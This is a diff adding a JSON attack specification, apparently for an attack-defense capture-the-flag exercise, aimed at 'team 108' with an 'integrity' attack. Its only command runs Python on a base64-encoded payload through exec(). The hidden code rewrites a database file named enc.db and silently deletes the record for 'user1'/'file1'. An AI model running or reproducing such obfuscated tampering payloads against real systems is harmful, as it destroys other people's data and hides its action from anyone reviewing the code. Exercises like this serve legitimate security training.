@@ -1,0 +1,7 @@
+{
+  "target_team": 108,
+  "type": "integrity",
+  "commands": [
+    {"program": "python3", "args": ["-c", "import base64;exec(base64.b64decode(\"aW1wb3J0IHN0cnVjdApVPTI1NisxNiszMjtGPTI1NisyNTYrMTYrMTYrNApkPW9wZW4oJ2VuYy5kYicsJ3JiJykucmVhZCgpCnA9MAp1Yz1zdHJ1Y3QudW5wYWNrX2Zyb20oJzxpJyxkLHApWzBdO3ArPTQKdWI9ZFtwOnArdWMqVV07cCs9dWMqVQpmYz1zdHJ1Y3QudW5wYWNrX2Zyb20oJzxpJyxkLHApWzBdO3ArPTQKa2Y9YicnO2tjPTAKZm9yIGkgaW4gcmFuZ2UoZmMpOgogICAgZnM9cAogICAgdW49ZFtwOnArMjU2XS5yc3RyaXAoYidceDAwJykuZGVjb2RlKCkKICAgIGZuPWRbcCsyNTY6cCs1MTJdLnJzdHJpcChiJ1x4MDAnKS5kZWNvZGUoKQogICAgZWw9c3RydWN0LnVucGFja19mcm9tKCc8aScsZCxwKzU0NClbMF07cCs9RitlbAogICAgaWYgbm90KHVuPT0ndXNlcjEnIGFuZCBmbj09J2ZpbGUxJyk6a2YrPWRbZnM6cF07a2MrPTEKb3BlbignZW5jLmRiJywnd2InKS53cml0ZShzdHJ1Y3QucGFjaygnPGknLHVjKSt1YitzdHJ1Y3QucGFjaygnPGknLGtjKStrZikK\").decode())"]}
+  ]
+}
